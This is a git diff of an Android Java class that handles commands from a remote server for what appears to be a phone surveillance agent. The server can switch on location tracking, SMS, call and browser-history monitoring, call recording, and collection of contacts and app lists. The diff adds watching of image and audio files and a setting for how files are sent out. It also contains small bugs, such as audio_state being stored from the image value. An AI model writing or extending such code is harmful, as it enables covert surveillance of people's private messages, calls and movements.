@@ -15,11 +15,12 @@ import com.inet.android.db.RequestDataBaseHelper;
 import com.inet.android.db.RequestWithDataBase;
 import com.inet.android.info.GetInfo;
 import com.inet.android.list.TurnSendList;
+import com.inet.android.media.monitorMediaFiles;
 import com.inet.android.sms.SmsSentObserver;
 import com.inet.android.utils.Logging;
 
 /**
- * Periodic request class
+ * Periodic request class is designed to handle the server's response
  * 
  * @author johny homicide
  * 
@@ -116,6 +117,8 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 
 		String str = null;
+		String audio = null;
+
 		try {
 			str = jsonObject.getString("code");
 		} catch (JSONException e) {
@@ -127,21 +130,21 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.putString("code", "");
 		}
 
-		// режим ожидания принятия решения
+		// --------Standby decision-----------
 		if (str.equals("1")) {
 			ed.putString("period", "1");
 			ed.commit();
 			return;
 		}
 
-		// переход в пассивный режим работы
+		// -------------transition to the passive mode--------
 		if (str.equals("3")) {
 			ed.putString("period", "10");
 			ed.commit();
 			return;
 		}
 
-		// ошибки
+		// ----------------errors-----------------
 		if (str.equals("0")) {
 			String errstr = null;
 			try {
@@ -158,7 +161,7 @@ public class PeriodicRequest extends DefaultRequest {
 			return;
 		}
 
-		// активный режим работы
+		// -----------active mode-----------------
 		if (str.equals("2")) {
 			if (sp.getBoolean("getInfo", false) == true) {
 				GetInfo getInfo = new GetInfo(ctx);
@@ -168,7 +171,7 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.putString("period", "1");
 			ed.commit();
 		}
-
+		// ----------frequency location------------
 		try {
 			str = jsonObject.getString("geo");
 		} catch (JSONException e) {
@@ -179,7 +182,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("geo", "0");
 		}
-
+		// -----------positioning mode----------------
 		try {
 			str = jsonObject.getString("geo_mode");
 		} catch (JSONException e) {
@@ -190,7 +193,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("geo_mode", "1");
 		}
-
+		// -----------monitoring sms----------------
 		try {
 			str = jsonObject.getString("sms");
 		} catch (JSONException e) {
@@ -202,7 +205,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("sms", "0");
 		}
-
+		// ------------monitoring of calls--------------
 		try {
 			str = jsonObject.getString("call");
 		} catch (JSONException e) {
@@ -213,7 +216,7 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("call", "0");
 		}
-
+		// ----------monitoring browser history-----------
 		try {
 			str = jsonObject.getString("www");
 		} catch (JSONException e) {
@@ -225,6 +228,7 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.putString("www", "0");
 		}
 
+		// ----------record call-----------
 		try {
 			str = jsonObject.getString("recall");
 		} catch (JSONException e) {
@@ -236,6 +240,7 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.putString("recall", "0");
 		}
 
+		// ----------time server-----------
 		try {
 			str = jsonObject.getString("UTCT");
 		} catch (JSONException e) {
@@ -247,6 +252,7 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.putString("UTCT", "0");
 		}
 
+		// --------start time work------------
 		try {
 			str = jsonObject.getString("time_from");
 		} catch (JSONException e) {
@@ -258,6 +264,7 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.putString("time_from", "");
 		}
 
+		// ------------stop time---------------
 		try {
 			str = jsonObject.getString("time_to");
 		} catch (JSONException e) {
@@ -269,6 +276,7 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.putString("time_to", "");
 		}
 
+		// ---------lunchtime start-------------
 		try {
 			str = jsonObject.getString("brk_from");
 		} catch (JSONException e) {
@@ -280,6 +288,7 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.putString("brk_from", "");
 		}
 
+		// ---------lunchtime stop----------------
 		try {
 			str = jsonObject.getString("brk_to");
 		} catch (JSONException e) {
@@ -290,6 +299,36 @@ public class PeriodicRequest extends DefaultRequest {
 		} else {
 			ed.putString("brk_to", "");
 		}
+		// ----------------image and audio detect----------------------
+		try {
+			str = jsonObject.getString("image");
+			audio = jsonObject.getString("audio");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null && audio != null) {
+			monitorMediaFiles stateImage = monitorMediaFiles
+					.getInstance(ctx);
+			ed.putString("image_state", str);
+			ed.putString("audio_state", str);
+			if (str.equals("1") || audio.equals("1")) {
+				if (stateImage.State() == false)
+					stateImage.StartWatcher();
+			} else
+				stateImage.StopWatcher();
+		}
+
+		// ----------------method of sending files----------------------
+		try {
+			str = jsonObject.getString("dispatch");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null)
+			ed.putString("dispatch", str);
+		else
+			ed.putString("dispatch", str);
+
 		// ---------------calls list------------------------
 
 		try {
@@ -300,7 +339,7 @@ public class PeriodicRequest extends DefaultRequest {
 		if (str != null)
 			if (!str.equals("0") && !sp.getString("list_call", "0").equals(str)) {
 				sendList.setList("1", str, null);
-		}
+			}
 		// ---------------sms list------------------------
 		try {
 			str = jsonObject.getString("sms_list");
@@ -318,8 +357,6 @@ public class PeriodicRequest extends DefaultRequest {
 			str = jsonObject.getString("contacts_list");
 		} catch (JSONException e) {
 			str = null;
-			Logging.doLog(LOG_TAG, "contacts null ", "contacts null ");
-
 		}
 		if (str != null)
 			if (!str.equals("0")
@@ -332,8 +369,6 @@ public class PeriodicRequest extends DefaultRequest {
 			str = jsonObject.getString("apps_list");
 		} catch (JSONException e) {
 			str = null;
-			Logging.doLog(LOG_TAG, "apps null ", "apps null ");
-
 		}
 		if (str != null)
 			if (!str.equals("0") && !sp.getString("list_app", "0").equals(str)) {
